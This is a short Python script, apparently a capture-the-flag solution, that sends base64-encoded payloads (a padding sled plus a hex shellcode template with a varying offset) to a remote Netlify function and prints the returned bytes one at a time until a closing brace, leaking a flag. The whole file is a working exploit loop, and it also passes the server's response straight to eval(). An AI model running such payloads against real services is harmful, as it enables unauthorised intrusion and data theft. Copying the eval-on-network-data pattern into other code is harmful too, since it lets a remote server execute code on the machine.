from urllib.request import urlopen
from urllib.error import HTTPError
import base64

url = "https://pingvin.spst.no/.netlify/functions/count?input="
nope_slide = "0c"*121
shellcode = "01$$040C160C09980c0c0c080800"
pl = nope_slide + shellcode
end = ord("}")

for i in range(6, 46):
    num = hex(i+256)[3:]
    payload = pl.replace("$$",num)
    encoded = bytes.fromhex(payload.replace(" ",""))
    res = eval(urlopen(url+base64.b64encode(encoded).decode()).read())["svar"][0]
    print(chr(res), end = "")
    if res == end:
        break
